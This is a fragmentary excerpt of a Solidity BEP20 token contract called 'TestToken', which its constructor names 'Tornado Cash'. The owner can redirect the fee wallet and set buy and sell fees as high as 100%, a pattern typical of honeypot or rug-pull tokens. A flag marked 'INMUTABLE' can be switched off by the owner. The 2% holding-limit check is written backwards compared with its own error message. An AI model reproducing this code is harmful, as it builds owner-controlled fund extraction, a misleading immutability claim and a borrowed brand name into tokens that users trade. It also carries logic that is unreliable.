...
contract TestToken is BEP20, MinterRole {
    ...
    address public feeWallet = 0x639670bEc0d40fD8A32e2f591C956dEDeb880FA3;
    
    uint256 public buyFee = 5;
    uint256 public sellFee = 5;   // default 5%
    uint256 public minTransferAmount = 10000000000000000000;   // 10 TestToken Token

    // Trading bool
    bool public tradingOpen;
    bool private _inTransferForTestToken;

    bool public transferForTestTokenEnabled = true; // INMUTABLE
    ...
    modifier lockTheTransfer {
        _inTransferForTestToken = true;
        _;
        _inTransferForTestToken = false;
    }

    /**z
     * @notice Constructs the TestToken token contract.
     */
    constructor() public BEP20("Tornado Cash", "TestToken") {
    ...
    /// @dev overrides transfer function to meet tokenomics of TestToken
    function _transfer(address sender, address recipient, uint256 amount) internal virtual override {
        ...
        if( 
            tradingOpen == true
            && transferForTestTokenEnabled == true 
            && _inTransferForTestToken == false
            && canTransfer
        ...
        if (sender == owner() || recipient == owner() || isExcludedFromFee[sender] || isExcludedFromFee[recipient]) {
            ...
            {
                require(amount.add(balanceOf(address(recipient))) > totalSupply().div(50), "One user can only hold less than 2% of total tokens");
            }
    ...
    function updateFeeWallet(address _feeWallet) public onlyOwner {
        require( _feeWallet != address(0), "TestToken:: tax fee address is zero" );
        emit UpdateFeeWallet(_feeWallet);
        feeWallet = _feeWallet;
    }

    function updateBuyFee(uint16 _buyFee) public onlyOwner {
        require( _buyFee <= 100, "TestToken:: Biu Fee can't exceed 100%" );
        emit UpdateBuyFee(_buyFee);
        buyFee = _buyFee;
    }

    function updateSellFee(uint16 _sellFee) public onlyOwner {
        require( _sellFee <= 100, "TestToken:: Sell Fee can't exceed 100%");
    ...
    function enableSwapTokenForTestToken(bool _enabled) public onlyOwner {
        transferForTestTokenEnabled = _enabled;
    }
